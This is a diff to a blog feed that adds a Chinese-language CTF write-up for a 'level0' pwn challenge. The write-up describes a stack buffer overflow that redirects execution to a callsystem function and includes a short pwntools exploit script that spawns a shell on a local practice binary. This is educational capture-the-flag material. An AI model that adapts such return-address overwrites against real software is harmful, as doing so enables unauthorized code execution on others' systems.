@@ -377,6 +377,26 @@
 
 <p><img src="https://cdn.jsdelivr.net/gh/azjzfyuan/images/202412041430248.png" alt="image-20241204143053201"></p>
 <p><img src="https://cdn.jsdelivr.net/gh/azjzfyuan/images/202412041423503.png" alt="image-20241204142330451"></p>
+<ol start="6">
+<li></li>
+</ol>
+<p>(本题涉及栈溢出，栈不平衡)</p>
+<p>首先查看main函数，没什么好看的，点开func（）</p>
+<p>发现read()函数</p>
+<p><img src="https://cdn.jsdelivr.net/gh/azjzfyuan/images/202412041520500.png" alt="image-20241204152005447"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/azjzfyuan/images/202412041521576.png" alt="image-20241204152136510"></p>
+<p>还可以发现callsystem函数，找到system函数，</p>
+<p>因此思路非常清晰，将buf溢出，控制到call system函数就可以了</p>
+<p><img src="https://cdn.jsdelivr.net/gh/azjzfyuan/images/202412041522476.png" alt="image-20241204152223395"></p>
+<p>exp：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>p = process(<span class="hljs-string">&quot;./level0&quot;</span>)<br>payload =  <span class="hljs-string">b&#x27;b&#x27;</span>*<span class="hljs-number">0x80</span>+p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0x0000000000400597</span>)<br>p.sendline(payload)<br>p.interactive()<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/azjzfyuan/images/202412041519892.png" alt="image-20241204151901820"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/azjzfyuan/images/202412041530974.png" alt="image-20241204153020897"></p>
+<ol start="7">
+<li></li>
+</ol>
+<p><img src="https://cdn.jsdelivr.net/gh/azjzfyuan/images/202412041536582.png" alt="image-20241204153640514"></p>
 ]]></content>
   </entry>
   <entry>
